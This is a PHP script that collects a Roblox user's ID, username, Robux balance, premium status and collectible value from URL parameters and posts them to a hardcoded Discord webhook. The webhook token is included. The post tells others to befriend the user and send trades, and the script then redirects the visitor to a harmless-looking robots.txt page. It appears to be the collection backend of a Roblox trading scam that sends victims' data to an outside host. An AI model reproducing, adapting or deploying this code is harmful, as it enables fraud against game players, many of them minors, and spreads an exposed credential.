<?php
// Set the webhook URL
$webhookurl = "https://discord.com/api/webhooks/1172622803086880849/6hSiFYmojDpYPaAiMt_-inhbfJ70fAa6_XoKVDQ5ISIWPD1Cj5AXUXtiqLhTKDW-n5Dv";

// Retrieve the user information from the URL
$userID = $_GET['UserID'];
$userName = $_GET['UserName'];
$robuxBalance = $_GET['RobuxBalance'];
$thumbnailUrl = $_GET['ThumbnailUrl'];
$isPremium = $_GET['IsPremium'];

// Retrieve the recent average price of the user's assets
$assetData = json_decode(file_get_contents("https://inventory.roblox.com/v2/users/{$userID}/inventory/collectibles?sortOrder=Asc&limit=100"));
$rap = 0;
foreach ($assetData->data as $asset) {
    $rap += $asset->recentAveragePrice;
}

// Set the Discord webhook message content and embed fields
$message = array(
    "username" => $userName,
    "avatar_url" => "https://tr.rbxcdn.com/bd5005e55ae7d83ddb30f4377a46780c/420/420/Face/Png",
    "content" => "@everyone",
    "embeds" => array(
        array(
            "color" => hexdec("8000FF"),
            "author" => [
                "name" => "CLICK ME TO SEND A TRADE!",
                "url" => "https://www.roblox.com/users/$userID/trade"
            ],
            "thumbnail" => [
                            "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userID&width=420&height=420&format=png",
            ],
            "title" => "**Friend and send a trade request to the account below!**",

            "fields" => array(
                array(
                    "name" => "Username",
                    "value" =>  "```{$userName}```",
                    "inline" => false
                ),
                array(
                    "name" => "Robux",
                    "value" => "```{$robuxBalance}```",
                    "inline" => false
                ),
                array(
                    "name" => "Premium",
                    "value" =>  "```{$isPremium}```",
                    "inline" => false
                ),
                array(
                    "name" => "RAP",
                    "value" =>  "```{$rap} Not working```",
                    "inline" => false
                ),
                array(
                    "name" => "Friend URL:",
                    "value" => "```https://www.roblox.com/users/$userID/profile```",
                    "inline" => false
                ),
                array(
                    "name" => "Trade Privacy",
                    "value" => "```Friends: Working ✅```",
                    "inline" => false
                )
            )
        )
    )
);

// Set the Discord webhook options
$options = array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-type: application/json',
        'content' => json_encode($message)
    )
);

// Send the Discord webhook request
$context = stream_context_create($options);
$result = file_get_contents($webhookurl, false, $context);

// Output the result
echo $result;
header('location: https://www.roblox.com/robots.txt');
die();
?>
